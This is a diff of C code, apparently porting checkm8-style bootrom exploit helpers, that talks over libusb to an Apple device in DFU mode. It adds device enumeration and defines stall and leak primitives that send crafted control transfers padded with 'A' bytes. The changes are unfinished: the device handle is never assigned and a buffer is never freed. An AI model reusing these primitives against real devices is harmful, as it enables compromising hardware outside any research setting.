@@ -8,14 +8,14 @@
 #include "util.h"
 // #include "vector.h"
 
-#define VENDOR_ID               0x5AC
+#define VENDOR_ID               0x05AC
 #define PRODUCT_ID              0x1227      // DFU mode
 
 static libusb_context* ctx = NULL;
 libusb_device_handle* handle = NULL;
 libusb_device* device = NULL;
 struct libusb_device_descriptor desc;
-char* serial_number[2048];
+char serial_number[2048];
 
 void init_ctx() {
     int status;
@@ -27,7 +27,21 @@ void init_ctx() {
 }
 
 void aquire_device() {
-    handle = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, PRODUCT_ID);
+    // if (!ctx) { libusb_init(&ctx); }
+    // handle = libusb_open_device_with_vid_pid(ctx, VENDOR_ID, PRODUCT_ID);
+    libusb_device** devices;
+    int count = libusb_get_device_list(ctx, &devices);
+
+    for (int i = 0; i < count; i++) {
+        libusb_device *device = devices[i];
+        struct libusb_device_descriptor test_desc = {0};
+
+        int rc = libusb_get_device_descriptor(device, &test_desc);
+        assert(rc == 0);
+
+        printf("Vendor:Device = %04x:%04x\n", test_desc.idVendor, test_desc.idProduct);
+    }
+
     if (handle) {
         printf("[x]\tDevice Found!\n");
     } else {
@@ -54,6 +68,10 @@ void release_device() {
     libusb_close(handle);
     handle = NULL;
     device = NULL;
+}
+
+void reset_device() {
+    libusb_reset_device(handle);
 }
 
 struct libusb_transfer* 
@@ -202,7 +220,11 @@ int no_error_ctrl_transfer(
 
 // def stall(device):   libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 'A' * 0xC0, 0.00001)
 int stall() {
-    return async_ctrl_transfer(0x80, 6, 0x304, 0x40A, fill_data('A', 0xC0), 1);
+    uint8_t* aC0 = malloc(0xC0);
+    memset(aC0, 'A', 0xC0);
+    int status = async_ctrl_transfer(0x80, 6, 0x304, 0x40A, aC0, 1);
+    // free(aC0);
+    return status;
 }
 
 // def leak(device):    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
@@ -228,4 +250,8 @@ int usb_req_leak() {
 // def usb_req_no_leak(device): libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41,  1)
 int usb_req_no_leak() {
     return no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, NULL, 0x41, 10);
+}
+
+char* get_serial_string() {
+    return serial_number;
 }
